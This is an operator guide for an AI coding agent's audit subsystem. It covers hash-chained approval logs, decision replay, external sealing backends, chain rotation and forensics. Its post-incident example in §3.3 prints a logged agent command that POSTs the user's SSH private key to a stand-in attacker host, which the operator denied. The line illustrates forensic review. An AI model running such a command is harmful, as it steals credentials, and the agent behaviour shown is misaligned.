# Forja Audit Operator Guide

Operational documentation for the audit subsystem. This is the **how-to** for operators running Forja in production, conducting post-incident review, or integrating audit data with external compliance pipelines.

Companion docs:
- `docs/SECURITY.md` — security architecture overview (this doc is the operational sibling to its §6).
- `docs/spec/AUDIT.md` — canonical specification (PT-BR). When this doc and the spec diverge, the spec wins.

Scope: what works today, what's spec'd but deferred, what the operator workflows look like end-to-end.

---

## 1. Quick reference

### 1.1 Audit tables (implemented)

| Table | Slice | Scope | Chain | Retention |
|---|---|---|---|---|
| `approvals_log` | 34 | per-install | SHA-256 chain | 365d |
| `failure_events` | 130 | per-session | SHA-256 chain | 365d |
| `outcome_signals` | 131 | derived (no chain) | — | per-kind (365d / 730d) |
| `chain_meta` | 35 | per-install | (lifecycle metadata) | forever |
| `approvals_log_archived` | 35 | per-install | (pre-rotation tip preserved) | forever |
| `tool_calls` | 1 | per-message | (no chain — v1 ledger) | 90d |
| `compaction_events` | mig 072 | per-session | (no chain — event log) | 90d† |

`approvals_log` / `failure_events` / `outcome_signals` are the **forensic floor**; `chain_meta` / `approvals_log_archived` / `tool_calls` support lifecycle (rotation history, raw tool I/O the chain references via `args_hash`). `compaction_events` (migration 072) is the compaction decision log: one row per compaction (a no-op `skipped` writes none) with `strategy`, `freed_bytes`, `before_hash` / `after_hash` (sha256 of the message array), and — load-bearing — the LLM `summary` text, which is non-deterministic and otherwise **lost on replay** (resume re-derives from the message log and re-compacts → a different summary). The relevance pre-pass also records `elided_ids` (which `tool_result`s were pointered). Detail: `CONTEXT_TUNING §12` (spec) / `SESSION.md` (impl companion).

† Retention is a **target, not yet enforced**: like `tool_calls`, no GC sweep for `compaction_events` is wired (`src/audit/gc.ts` has no case for it), so rows persist until one lands. Note `summary` is medium-sensitivity (may carry code / paths) — mind that in audit exports. ("Slice" column reads `mig 072` because this shipped via the migration, not a numbered slice.)

### 1.2 CLI verbs (implemented)

| Verb | Purpose |
|---|---|
| `forja permission verify` | Walk `approvals_log` chain, report integrity + first-mismatch row |
| `forja permission seal-verify` | Cross-reference seal store against the chain (install_id bound, slice 128) |
| `forja permission inspect <rotation_id> [--clear]` | Inspect a rotation segment (head, tail, row count, motive). `--clear` flips `chain_meta.quarantined=0` after operator review — REQUIRED to fully accept a rotation (every rotation defaults to quarantined). |
| `forja permission replay <seq>` | Render a single audit row + reason chain + score + classifier + sandbox profile |
| `forja permission diff <seq1> <seq2>` | Diff two rows field by field — primary scalars (tool, decision, confidence, score, classifier_hash, policy_hash, sandbox_profile, args_hash, session_id, plus `parent_approval_id` / `ttl_expires_at` / `install_id` added by slice 177), capabilities set diff (only-in-seq1 / only-in-seq2 / common), score_components per-key deltas, and the FULL reason chain rendered stage-by-stage (slice 177 — pre-slice the diff filtered out most chain entries via a mismatched local type) |
| `forja permission rotate-chain --reason "<msg>"` | Archive current chain, start a new genesis (audit-loud) |
| `forja permission seal-now` | Force an immediate seal of the current chain head |
| `forja permission grants [--all]` | List active grants (operator-issued time-bound allow rules) |
| `forja permission revoke <id>` | Revoke a grant by ID |
| `forja permission policy-list` | List archived policy snapshots |
| `forja permission policy-rollback <hash>` | Restore an archived policy |
| `forja permission calibration-export [--json] [--since-days N] [--all-decisions]` | Export `(score, decision, outcome)` triples for offline regression (spec §6.3.2.2, slice 138) |
| `agent perms` / `--explain-permissions` | Render merged effective policy with per-section layer attribution |

### 1.3 Deferred (spec-only, not yet implemented)

| Feature | Spec section | Status |
|---|---|---|
| `agent audit timeline <session>` | AUDIT.md §6 | Reader primitives exist (`listFailureEventsBySession`, etc.); CLI verb deferred |
| `agent audit failures --since 7d` | AUDIT.md §6 | Reader primitives exist; CLI verb deferred |
| `agent audit costs --by tool` | AUDIT.md §6 | Deferred |
| `agent forensics <session>` | AUDIT.md §5 | Bundle generation deferred |
| `forja gc` | AUDIT.md §10.3 | Retention sweep deferred |
| `redaction_events` table | AUDIT.md §3.3 | Pipeline partial (`telemetry/scrubbing.ts` exists); dedicated table not migrated |
| Offline calibration regression (steps 2-5 of §6.3.2 plan) | PERMISSION_ENGINE.md §6.3.2 | Out-of-tree (operator tooling — Python/R/etc.) consumes the NDJSON emitted by `forja permission calibration-export --json` (slice 138, §6.3.2.2). Step 1 (triple extraction) is in-tree as of slice 138. |

When operators ask about these features, the answer today is "the data is there, the CLI verb to surface it isn't". Reader functions are exported from `src/permissions/index.ts`, `src/failures/index.ts`, `src/outcomes/index.ts` for script-side use.

---

## 2. Daily workflow: routine review

The simplest healthy-system operator routine:

```bash
# Verify chain integrity. Walks every row, recomputes prev_hash → this_hash.
# Bounded by per-install retention (~100k rows / 365d default).
$ forja permission verify
chain ok: 1842 rows from genesis at sha256:e5f3...
no rotations, current rotation_id=0
not quarantined

# Verify seal store cross-references the chain. Only meaningful when sealing
# is configured (worm-file / rfc3161 / git-anchored / s3-object-lock).
$ forja permission seal-verify
seal ok: 367 entries against chain rows 1, 6, 11, ..., 1841
last seal at 2026-05-13T14:23:11Z (worm-file backend)
```

When both report `ok`, the audit chain is **internally consistent** AND **externally anchored**. The chain itself could still be entirely fabricated by a root attacker — that's why the external seal is load-bearing.

### 2.1 Tightening the loop

Add to crontab for production environments:

```cron
# Verify daily, alert on non-ok.
0 4 * * * forja permission verify --json | jq -e '.ok' >/dev/null || mail -s "FORJA AUDIT BROKEN" you@example.com
0 4 * * * forja permission seal-verify --json | jq -e '.ok' >/dev/null || mail -s "FORJA SEAL MISMATCH" you@example.com
```

The `--json` output is stable across versions (audit schema versioning per AUDIT.md §8). Operators who want JSON-only output for piping to alerting systems can request it on any read verb.

### 2.2 Calibration sweep (slice 138)

The risk-score `baseline-v2.0` weights (PERMISSION_ENGINE.md §6.3.2) are an informed guess. Once a pilot deployment has run for ~30 days, the spec calls for re-deriving the weights via logistic regression over `(score, decision, outcome)` triples.

**Step 1 (in-tree, slice 138)** — extract the triples for the current install:

```bash
# Text summary on stdout: how much data is in the window?
$ forja permission calibration-export --since-days 30
calibration export — install_id=68ac9b74-b6d2-4683-ac42-3c96026f7fcb
window: last 30 days
triples: 1423
  harmful : 87
  harmless: 1336
  with at least one outcome_signal: 312
by decision:
  confirm-allowed: 891
  confirm-denied: 532

# NDJSON on stdout for offline analysis; coverage summary on stderr.
$ forja permission calibration-export --json --since-days 30 > triples.ndjson 2> coverage.txt
```

The default decision filter keeps `confirm-allowed` + `confirm-denied` only — those are the clean human labels. Auto-allow / auto-deny rows have zero direct outcome signal and would skew the regression; widen with `--all-decisions` only if your offline pipeline accounts for selection bias.

**Steps 2-5 (out-of-tree)** — logistic regression on the NDJSON, A/B test the derived weights against the baseline, and bump `DEFAULT_SIGNAL_WEIGHTS` in `src/outcomes/codes.ts` (audit-log marker advances to `outcome-baseline-v2.1`). The regression tooling itself is the operator's choice (Python / R / etc.) consuming the NDJSON envelope documented in spec §6.3.2.2.

Sparse window (`<100` triples) triggers a soft hint in the text output — running the regression on too little data overfits the baseline. The hint is advisory only; the verb still emits whatever triples exist.

---

## 3. Post-incident review

Use case: "Something went wrong yesterday. What did the agent do, and how was it authorized?"

### 3.1 Find the session

```bash
$ forja --list-sessions --since 24h
sess-7a3f...  2026-05-12 14:02  cost=$0.41 steps=12 status=done
sess-9b8c...  2026-05-12 18:55  cost=$0.18 steps=4  status=error  ← likely
sess-2d1e...  2026-05-13 09:11  cost=$0.62 steps=23 status=done
```

The `error` status session is the candidate. The `--list-sessions` output is sorted DESC by started_at.

### 3.2 Walk the session's decisions

```bash
# Lower-level: query approvals_log directly.
$ sqlite3 ~/.local/share/forja/audit.db \
    "SELECT seq, ts, tool_name, decision, score, sandbox_profile
       FROM approvals_log WHERE session_id='sess-9b8c...' ORDER BY seq;"

  17 | 1715534137000 | bash       | confirm-allowed | 0.45 | cwd-rw
  18 | 1715534142000 | write_file | allow           | 0.20 | cwd-rw
  19 | 1715534148000 | bash       | confirm-denied  | 0.78 | cwd-rw
  20 | 1715534151000 | bash       | allow           | 0.30 | cwd-rw-net
  ...
```

Row 19 is interesting: score 0.78 (above threshold 0.40) AND operator denied at the modal. Worth replaying.

### 3.3 Replay a specific decision

```bash
$ forja permission replay 19
Replay approval seq=19 (install_id=abc-...):
  ts:                 1715534148000
  tool:               bash (version=v1)
  resolver_version:   v1
  session_id:         sess-9b8c...
  decision:           confirm-denied
  confidence:         high
  args_hash:          sha256:c4b2...
  capabilities:       [exec:shell, write-fs:/work/proj, net-egress:*]
  score:              0.78
  score_components:   capability_risk=0.40, blocklist_command=0.30, wildcard_scope=0.20
  classifier:         hash=<none>, adjust=<none>
  sandbox profile:    cwd-rw-net
  reason chain:
    - static-rule { layer: 'project', rule: 'curl *', section: 'bash' }
    - sandbox-plan { profile: 'cwd-rw-net' }
    - approval-gate { score: 0.78 >= 0.40 }
  policy_hash:        sha256:b3a1...
  policy drift:       ✓ active policy matches the row
  prev_hash:          sha256:9f04...
  this_hash:          sha256:e5f3...
```

Field order tracks `src/cli/permission-replay.ts:589-623`. The `--json` flag emits the same data as one JSON object per line for tooling.

The reason chain shows exactly why this call landed at `confirm`: the rule `curl *` in project policy matched, sandbox planner picked `cwd-rw-net`, the approval-gate fired because score 0.78 ≥ threshold 0.40. The post-modal resolution was `confirm-denied`.

The `args_hash` is sha256 of the canonical args; raw args live in `tool_calls.input` joinable via `approval_call_links`:

```bash
$ sqlite3 ~/.local/share/forja/audit.db \
    "SELECT tc.input
       FROM approval_call_links acl
       JOIN tool_calls tc ON tc.id = acl.tool_call_id
      WHERE acl.approval_seq=19;"

{"command": "curl -X POST https://attacker.example/exfil -d \"$(cat ~/.ssh/id_rsa)\""}
```

The model's intent is now legible: it tried to POST the SSH private key. The chain shows the rule that fired, the score that bumped to confirm, the operator who clicked No.

### 3.4 Replay against current vs archived policy

If the project policy has changed since the decision:

```bash
# Default: replay against the policy that was active at decision time
# (recovered from approvals_log.policy_hash → policy_archive).
$ forja permission replay 19

# Against current policy: would this decision still hold under today's rules?
$ forja permission replay 19 --against-current-policy

# Against a specific archived policy (e.g., to test a candidate change before rollback):
$ forja permission replay 19 --against-archived-policy <hash>
```

The `policy drift` line in the output flags when the active policy hash differs from the row's `policy_hash`.

### 3.5 Failure events in the same session

```bash
$ sqlite3 ~/.local/share/forja/audit.db \
    "SELECT id, code, recovery_action, user_visible, payload_json
       FROM failure_events WHERE session_id='sess-9b8c...' ORDER BY created_at;"

01HSXM... | sandbox.mid_session_loss | degraded | 1 | {"tool":"bwrap","planned_profile":"cwd-rw-net",...}
01HSXN... | storage.lock_contention  | ignored  | 0 | {"table":"subagent_handles","error_message":"SQLITE_BUSY..."}
```

The first row says the sandbox tool was lost mid-session — the bash call landed in `cwd-rw-net` profile but executed unsandboxed. Important context for understanding why the `curl` attempt could have succeeded if the operator had approved.

### 3.6 Outcome signals for the decision

```bash
$ sqlite3 ~/.local/share/forja/audit.db \
    "SELECT signal_kind, signal_weight, payload_json
       FROM outcome_signals WHERE approval_seq=19;"

session_aborted | 0.2 | {"exit_reason":"maxToolErrors","abort_cause":"hard"}
```

The session terminated abnormally; one signal landed. Composite via aggregator:

```bash
$ bun --print '(await import("/path/to/forja/src/outcomes/index.ts")).computeOutcomeForApproval(db, 19)'
{ outcome: 'harmless', composite: 0.2, signals: [...] }
```

The composite max-wins is 0.2, below the 0.5 threshold — `harmless`. Calibration would label this approval as "operator correctly denied a high-score request, no harm occurred". Useful training data for v2.1 weight derivation.

---

## 4. Sealing backends

The hash chain inside the DB is only as trustworthy as the DB file. **External sealing** periodically commits a `(seq, hash)` pair to an out-of-DB store. Without a configured sealer, an attacker with root can rewrite the entire `approvals_log` consistently and `forja permission verify` will report `ok`.

Four backends. Choose based on threat model + operational constraints.

### 4.1 `worm-file` (Linux only)

`src/permissions/sealing.ts:createWormFileSealer`.

Append-only file with `chattr +a` (Linux append-only attribute). Requires root for the initial `chattr` operation (subsequent appends do not).

```yaml
# .forja/permissions.yaml or ~/.config/forja/permissions.yaml
seal:
  mode: worm-file
  path: /var/lib/forja/audit-seal.log
  interval_decisions: 100        # seal every 100 audit rows
  interval_seconds: 3600         # OR every hour, whichever first
  on_failure: refusing           # engine state if seal write fails
```

Setup:

```bash
$ sudo touch /var/lib/forja/audit-seal.log
$ sudo chown $USER /var/lib/forja/audit-seal.log
$ sudo chattr +a /var/lib/forja/audit-seal.log
# Forja can now append; nobody can rewrite without `chattr -a` (root).
```

**Threat model:** defends against the operator's own user account being compromised. Root attacker can `chattr -a` and rewrite. Single-host — no replication.

**Operational cost:** near zero. One file append per seal cycle.

**Refused on non-Linux:** slice 128 R4 P0-Audit-4 made worm-file constructor throw on macOS/BSD. Pre-slice the platform was silently degraded; operators on macOS got an unprotected seal file that `verifySealAgainstChain` still trusted. Today the operator must pick a different backend on non-Linux.

### 4.2 `rfc3161-tsa`

`src/permissions/sealing-rfc3161.ts`.

External Time-Stamp Authority signs each seal entry with a cryptographic timestamp binding the chain head to wall-clock time. Per IETF RFC 3161.

```yaml
seal:
  mode: rfc3161-tsa
  tsa_url: https://freetsa.org/tsr
  ca_cert_path: /etc/ssl/certs/freetsa.crt
  interval_decisions: 100
  interval_seconds: 3600
  on_failure: degraded
```

**Threat model:** defends against root attacker on operator's machine. The TSA's signature is verifiable independently — even if the seal file is rewritten, the TSA's signed timestamps are not.

**Operational cost:** one HTTP request per seal cycle (typically 50–200ms). The TSA must be reachable. Public TSAs (freetsa.org, DigiCert) are free but rate-limited; commercial TSAs offer SLAs.

**Limitation (deferred):** Forja currently emits and stores the TSR (Timestamp Response) but **does not yet verify the TSA signature on read** (R4 deferred — requires ASN.1 / TSTInfo parser + trust anchor mgmt). Verify confirms only that the row is present in the seal log; the cryptographic chain to the TSA is recorded but not cross-checked at verify time.

### 4.3 `git-anchored`

`src/permissions/sealing.ts:createGitAnchoredSealer`.

Commits seal entries to a dedicated git ref (e.g., `refs/forja/audit-seal`). Pushed to a remote, the seal inherits whatever durability the remote provides (GitHub redundancy, signed commits via gpg, branch protection rules).

```yaml
seal:
  mode: git-anchored
  repo_path: /var/lib/forja/audit-seal.git    # bare repo
  ref: refs/forja/audit-seal
  remote: origin
  push_on_seal: true
  interval_decisions: 100
  interval_seconds: 3600
  on_failure: degraded
```

**Threat model:** defends against single-host compromise (the remote is independent). Combine with GitHub branch protection + signed commits for cryptographic federation.

**Operational cost:** one git commit per seal cycle + optional push. Push adds network latency. Bare repo on local disk keeps the local commit cheap.

**Limitation (deferred):** like RFC3161, the cryptographic verification (signed-commit trust anchor) is not yet implemented at verify time (R4 deferred).

### 4.4 `s3-object-lock`

`src/permissions/sealing-s3-object-lock.ts`.

Writes each seal entry as an S3 object with COMPLIANCE-mode Object Lock (immutable for the configured retention period; not even the bucket owner can delete).

```yaml
seal:
  mode: s3-object-lock
  bucket: my-forja-audit
  prefix: seal/
  region: us-east-1
  retention_days: 365
  interval_decisions: 100
  interval_seconds: 3600
  on_failure: refusing
```

**Threat model:** strongest in the catalog. Defends against root + cloud-account compromise (COMPLIANCE-mode lock prevents AWS account holder deletion). Requires AWS credentials with `s3:PutObject` + `s3:PutObjectRetention` permissions.

**Operational cost:** one S3 PUT per seal cycle (~50–200ms). Cost: S3 PUT pricing + storage. At 100 decisions / 1KB per seal entry / 365d retention, well under $1/month for typical workloads.

**Caveat:** the bucket must have Object Lock enabled at creation time (cannot be added later). Operator MUST configure this BEFORE pointing Forja at it; the sink throws on bucket without lock enabled.

### 4.5 Choosing a backend

| Backend | Setup cost | Threat model | Verify cost | Recommended for |
|---|---|---|---|---|
| `worm-file` | Low (root once for chattr) | User-account compromise | O(1) | Linux desktop, dev workflow |
| `rfc3161-tsa` | Medium (TSA cert config) | Host compromise + offline forensics | Medium (HTTP per verify) | Regulated environments needing third-party timestamps |
| `git-anchored` | Low–Medium (remote setup) | Host compromise via remote redundancy | O(1) per ref check | Teams that already use signed-commit workflows |
| `s3-object-lock` | High (AWS account, IAM, bucket policy) | Full host + cloud-account compromise | Medium (S3 GET per verify) | Compliance-heavy production deployments |

The `on_failure` policy field dictates engine state when a seal write fails (`degraded` keeps the engine running with every would-be-allow becoming confirm; `refusing` kills the engine until repair). Production deployments with `s3-object-lock` typically use `refusing` — the seal failure indicates the trust anchor is broken.

---

## 5. Chain rotation

Use case: chain has been broken (verify failed), OR scheduled rotation for compliance (annual audit handover), OR cryptographic primitive upgrade (SHA-256 → SHA-3-256 someday).

### 5.1 What rotation does

`src/storage/repos/chain-rotation.ts`. Spec §7.2.

1. INSERT every current `approvals_log` row into `approvals_log_archived` with the same columns + a new `archive_rotation_id`.
2. INSERT a new `chain_meta` row recording: rotation_id (new), reason, pre-rotation tip hash, rotated_at_ms.
3. DELETE every row from `approvals_log`.
4. The next `engine.check` derives a NEW genesis = `SHA256(install_id || rotated_at_ms || rotation_id)` and starts a fresh chain.

Operator perspective: pre-rotation data is preserved verbatim in the archived table; queries against current `approvals_log` see only post-rotation data; replays explicitly against archived data use `--against-archived-policy`.

### 5.2 Running a rotation

```bash
$ forja permission rotate-chain --reason "annual handover"
chain rotated:
  rotation_id: 2
  pre-rotation tip: sha256:b3a1...
  archived rows: 18341
  new genesis: GENESIS-ROTATED:sha256:f2e8...
chain_meta inserted: rotation_id=2 reason="annual handover"

next decisions land in a fresh chain.
```

The `--reason` is required — rotation is audit-loud, and `chain_meta.reason` is part of the forensic record.

### 5.3 Inspecting a rotation + quarantine clearance

**Every rotation lands quarantined.** `chain_meta.quarantined DEFAULTS to 1` (`migration 035-chain-rotation.ts:75`). The flag is the system's way of saying "you initiated a rotation — confirm you've reviewed the archived segment before treating it as accepted history". An operator who runs `rotate-chain` and never inspects leaves every rotation forever-quarantined; the rows stay in `approvals_log_archived` queryable, but flagged.

Inspecting (without `--clear`) reports current quarantine state:

```bash
$ forja permission inspect 2
Inspect rotation_id=2 (install_id=abc-...):
  rotated_at:             1715581200000
  reason:                 annual handover
  pre-rotation tip:       seq=18341 hash=sha256:b3a1...
  archived rows:          18341
  quarantined (before):   yes

  Status: rotation segment is QUARANTINED — operator inspection required.
  Inspect with: SELECT * FROM approvals_log_archived WHERE archive_rotation_id = 2;
  Clear after inspection: forja permission inspect 2 --clear
```

After reviewing the archived rows (via the suggested SQL or a forensics tool), clear:

```bash
$ forja permission inspect 2 --clear
Inspect rotation_id=2 (install_id=abc-...):
  rotated_at:             1715581200000
  reason:                 annual handover
  pre-rotation tip:       seq=18341 hash=sha256:b3a1...
  archived rows:          18341
  quarantined (before):   yes
  quarantined (after):    no
  status:                 ✓ quarantine cleared
```

The `--clear` flag flips `chain_meta.quarantined` from `1` to `0` and writes the change. Idempotent — re-running on an already-cleared rotation reports `(already clear — no change)`.

`forja permission verify` reports `quarantined: true` in its JSON output as long as ANY rotation segment for the current install is quarantined. Operators wanting their nightly verify to stay green must clear each rotation after review.

### 5.4 Accepting a broken chain

`forja permission verify` reports break:

```bash
$ forja permission verify
chain BROKEN at seq=4521:
  expected this_hash: sha256:e5f3...
  actual this_hash:   sha256:d8a2...

  options:
    1. Stop using this install. Spin up fresh, restore from seal/backup.
    2. Rotate-chain to start fresh, quarantining the broken segment.
    3. --accept-broken-chain: continue using THIS install with a
       chain-break-accepted audit row (audit-loud).
```

Choice 3 is for environments where rotating is operationally expensive. The accept flag writes a `chain-break-accepted` audit row BEFORE the engine starts accepting new decisions:

```bash
$ forja --accept-broken-chain
# Engine boots. First audit row is reason_chain=[{stage:'chain-break-accepted', ...}]
# Subsequent decisions chain from the broken tip.
# Future verify reports the original break PLUS the explicit accept.
```

The accepted-break row is queryable via `listChainBreakAcceptedRows(db, install_id)` (`src/permissions/audit.ts`). Post-incident review can distinguish "chain broke and was rotated" from "chain broke and was deliberately continued".

---

## 6. Forensics (deferred — spec only)

Spec AUDIT.md §5 defines `agent forensics <session>` producing `forensics_<session>_<unix_ts>.tar.gz` with:

```
manifest.json                # metadata + integrity (cosign-signed)
session.json                 # row from sessions
messages.ndjson
tool_calls.ndjson
approvals.ndjson             # v1 approvals (modal answers)
approvals_log.ndjson         # v2 hash-chained ledger
hook_runs.ndjson
failure_events.ndjson
outcome_signals.ndjson       # NEW (slice 131)
memory_events.ndjson
checkpoints.ndjson
subagent_outputs.ndjson
traces.ndjson                # OTEL spans
redaction_events.ndjson      # spec-only; pipeline partial today
chain_verification.json      # result of `forja permission verify`
signature.sig                # cosign signature of manifest.json
```

**Status:** the reader primitives exist (`listFailureEventsBySession`, `listApprovalsLogBySession`, etc.) and tests use them; the bundle generation CLI verb + manifest signing + tarball assembly are deferred.

**Workaround until the verb lands:** operators can write an ad-hoc bundle script:

```bash
#!/bin/bash
# scripts/forensics-bundle.sh — adhoc until `agent forensics` lands
SESSION=$1
OUT=forensics_${SESSION}_$(date +%s).tar.gz
DB=~/.local/share/forja/audit.db
TMPDIR=$(mktemp -d)
trap "rm -rf $TMPDIR" EXIT

sqlite3 $DB "SELECT json_object('session', json_group_array(json(*))) FROM sessions WHERE id='$SESSION'" > $TMPDIR/session.json
for table in messages tool_calls approvals approvals_log hook_runs failure_events outcome_signals memory_events checkpoints subagent_outputs; do
  sqlite3 $DB ".mode json" "SELECT * FROM $table WHERE session_id='$SESSION'" > $TMPDIR/$table.ndjson
done
forja permission verify --json > $TMPDIR/chain_verification.json
tar -czf $OUT -C $TMPDIR .
echo "wrote $OUT"
```

This produces the unsigned content of the bundle. The future `agent forensics` verb will add the cosign signature + manifest hash list + redaction summary.

---

## 7. Compliance integration

### 7.1 NDJSON export for SIEM

Every audit table is exportable to NDJSON for ingestion into Splunk / Elasticsearch / Datadog / similar:

```bash
$ sqlite3 ~/.local/share/forja/audit.db ".mode json" \
    "SELECT * FROM approvals_log WHERE ts >= strftime('%s','now','-7 days')*1000" \
  | jq -c '.' \
  > approvals-last-7d.ndjson
```

Schema is stable across slices within a major version. AUDIT.md §8 defines `audit_schema_version` for cross-version compatibility (not yet a column per table; today the row shape is read from `MIGRATIONS` and the consumer assumes it's current).

### 7.2 Audit modes

Spec AUDIT.md §7.1 defines three modes (NOT yet a runtime flag — today the system runs `full` always):

- **`full`** (default) — every event lands in every table.
- **`sampled`** — `default_rate = 0.1` (10% retention), importance rules guarantee 100% for failures + denies + slow ops.
- **`minimal`** — only `failure_events` + `approvals`. Other tables suppressed.

Until the runtime knob lands, operators wanting reduced audit overhead can periodically `DELETE FROM <table> WHERE created_at < ...` (under `retention.ts`-permitted patterns per spec §4.1's UPDATE/DELETE rule).

### 7.3 Cost queries

Until `agent audit costs --by tool` ships, operators can query directly:

```bash
$ sqlite3 ~/.local/share/forja/audit.db \
    "SELECT tool_name, COUNT(*) calls, SUM(score) total_risk
       FROM approvals_log WHERE ts >= ? GROUP BY tool_name ORDER BY calls DESC LIMIT 20;" \
    "$(date -d '7 days ago' +%s)000"

bash         | 412 | 87.3
read_file    | 287 | 12.1
fetch_url    | 56  | 22.4
git          | 38  | 5.2
...
```

Total provider cost lives in `sessions.cost_usd_total` (and per-step in `cost_progress_events`); audit just stores risk score.

---

## 8. Retention + garbage collection (deferred)

Spec AUDIT.md §1.2 specifies per-table retention; `forja gc` is the planned sweep mechanism. **Status: not yet implemented.**

Until `forja gc` ships, operators can run manual cleanup with the spec's retention defaults:

```bash
# Delete sessions + cascading rows older than 90 days.
$ sqlite3 ~/.local/share/forja/audit.db \
    "DELETE FROM sessions WHERE started_at < strftime('%s','now','-90 days')*1000;"

# `failure_events` per-session FK is best-effort; orphans cleaned by:
$ sqlite3 ~/.local/share/forja/audit.db \
    "DELETE FROM failure_events WHERE created_at < strftime('%s','now','-365 days')*1000;"

# `outcome_signals` uses per-row ttl_expires_at:
$ sqlite3 ~/.local/share/forja/audit.db \
    "DELETE FROM outcome_signals WHERE ttl_expires_at < strftime('%s','now')*1000;"

# VACUUM to reclaim space.
$ sqlite3 ~/.local/share/forja/audit.db "VACUUM;"
```

**Important:** Manual DELETE on `approvals_log` requires care. The chain validates `prev_hash` linkage; deleting middle rows breaks `verify`. Always use `forja permission rotate-chain` to archive then purge atomically, not raw DELETE.

---

## 9. Privacy + redaction

`src/telemetry/scrubbing.ts` carries the canonical regex set. Applied at:

- `failure_events.payload_json` — via `scrubFailurePayload` (slice 130).
- `outcome_signals.payload_json` — via `scrubOutcomePayload` (alias to scrubFailurePayload, slice 131).
- `tool_calls.input` / `tool_calls.output` — full redaction per AUDIT.md §1 (`high` sensitivity).
- `messages.content` — full redaction.

Regex catalog:

- Paths: POSIX (`/home/user/...`), Windows (`C:\Users\...`), UNC (`\\server\share`), tilde-rooted (`~/.config/...`).
- URLs: full RFC 3986 scheme grammar (`s3://`, `postgres://`, `mongodb+srv://`, etc.) — slice 128 R4 P1 refined the regex to catch non-http schemes the audit pipeline previously ignored.
- Hosts: bracketed IPv6, IPv4 with port, git-SSH (`user@host:path`), domain:port.
- Tokens: GitHub PAT (`gh[ps]_*`), JWT (3-part base64), AWS access keys, high-entropy generic.

The `redaction_events` table is spec'd (AUDIT.md §3.3) but not yet migrated. When it lands, every redaction operation records a row with the pattern that matched and the location (table.column), letting operators audit "what was redacted from this session" without recovering the redacted content.

**Limits of redaction** (AUDIT.md §3.5):

- Custom credentials in operator-specific patterns (proprietary auth tokens) are NOT matched by the default catalog. Operators must extend `scrubbing.ts` or accept the gap.
- Free-form user prompts that mention secrets verbatim are redacted IF they match the regex set, but a creative user typing "`my password is foo`" with no token shape escapes the regex.
- Tool outputs from MCP servers are scrubbed but the MCP server itself is trusted — a malicious MCP server logging operator credentials to its own systems is out of Forja's defense.

---

## 10. Verification decision tree

```
forja permission verify → ?
├─ ok: 1842 rows, not quarantined
│  └─ healthy. routine review only.
│
├─ ok: 1842 rows, quarantined=true (prior rotation accepted a break)
│  └─ chain is healthy POST-rotation, but the archived segment was
│     marked untrustworthy. Forensics on the archived chain requires
│     `inspect <prior_rotation_id>` to confirm what was preserved.
│
└─ broken: prev_hash mismatch at seq=N
   │
   ├─ Has the DB file been modified outside Forja?
   │  ├─ Yes (operator action / migration mishap)
   │  │  └─ Operator error. Restore from backup OR rotate + accept.
   │  │
   │  └─ No
   │     │
   │     ├─ Does seal-verify confirm a tampered row?
   │     │  ├─ Yes
   │     │  │  └─ Active tampering detected. STOP THE INSTALL.
   │     │  │     Generate forensics bundle. Rotate keys.
   │     │  │     Investigate root cause before reuse.
   │     │  │
   │     │  └─ No (seal-verify ok but verify broken)
   │     │     └─ Possible: chain rotation happened but seal store
   │     │        wasn't updated. Re-run seal-now then re-verify.
   │     │
   │     └─ Storage corruption (disk error, bun:sqlite version bump)
   │        └─ Restore from backup. If no backup, rotate + accept
   │           with reason="storage corruption at <date>".
   │
   └─ Operational paths after the diagnosis:
      ├─ Discard install: rm ~/.local/share/forja, re-init.
      ├─ Rotate: forja permission rotate-chain --reason "<diagnosis>"
      └─ Accept: forja --accept-broken-chain  (audit-loud; visible in chain_meta)
```

---

## 11. Schema reference

The implementation is the source of truth. Migrations:

- `src/storage/migrations/001-initial.ts` — sessions, messages, tool_calls, approvals (v1).
- `src/storage/migrations/034-approvals-log.ts` — v2 hash-chained ledger.
- `src/storage/migrations/035-chain-rotation.ts` — approvals_log_archived + chain_meta.
- `src/storage/migrations/037-policy-archive.ts` — policy snapshots.
- `src/storage/migrations/039-grants.ts` — operator-issued time-bound allow rules.
- `src/storage/migrations/041-failure-events.ts` — slice 130.
- `src/storage/migrations/042-outcome-signals.ts` — slice 131.
- `src/storage/migrations/043-bg-bytes-dropped.ts` — bg-process bookkeeping (truncate-head byte counters for stdout/stderr log caps; not an audit table per se, listed here for migration completeness — slice 153).

Inspect any table's columns:

```bash
$ sqlite3 ~/.local/share/forja/audit.db ".schema approvals_log"
$ sqlite3 ~/.local/share/forja/audit.db ".schema failure_events"
$ sqlite3 ~/.local/share/forja/audit.db ".schema outcome_signals"
```

For the canonical hash-input column ordering used by the chain hash computation:

```bash
$ grep -A 30 "const PERSISTED_COLUMNS" src/storage/repos/approvals-log.ts
$ grep -A 15 "const PERSISTED_COLUMNS" src/storage/repos/failure-events.ts
$ grep -A 15 "const PERSISTED_COLUMNS" src/storage/repos/outcome-signals.ts
```

Column reorder = chain hash change = `verify` fails post-migration. The persisted column list is the load-bearing convention.

---

## 12. References

- **Canonical specification:** `docs/spec/AUDIT.md` (PT-BR) — protocol document; this file is operational sibling.
- **Security architecture:** `docs/SECURITY.md` §6 (audit trail summary) + §5.5.11 (operator introspection surfaces).
- **Permission engine internals:** `docs/SECURITY.md` §3 + `docs/spec/PERMISSION_ENGINE.md` §7.
- **Implementation entry points:**
  - Chain emission: `src/permissions/audit.ts` (`createSqliteSink`, `verifyChain`, `computeGenesisHash`).
  - Chain rotation: `src/storage/repos/chain-rotation.ts` (repo) + `src/cli/permission-inspect.ts` (CLI verb).
  - Sealing: `src/permissions/sealing*.ts` (worm-file, RFC3161, git-anchored, s3-object-lock).
  - Failure events: `src/failures/sink.ts`.
  - Outcome signals: `src/outcomes/{sink,aggregator}.ts`.
  - CLI: `src/cli/permission-{verify,seal-verify,inspect,replay,diff,grants,revoke,seal-now,policy-*}.ts`.
- **Per-slice history:** `docs/BACKLOG.md` — slices 34 (approvals_log), 35 (rotation), 56–63 (sealing backends), 121 (broker proto-pollution), 127–129 (R3–R5 hardening passes), 130 (failure_events), 131 (outcome_signals), 132 (spec PR alignment).
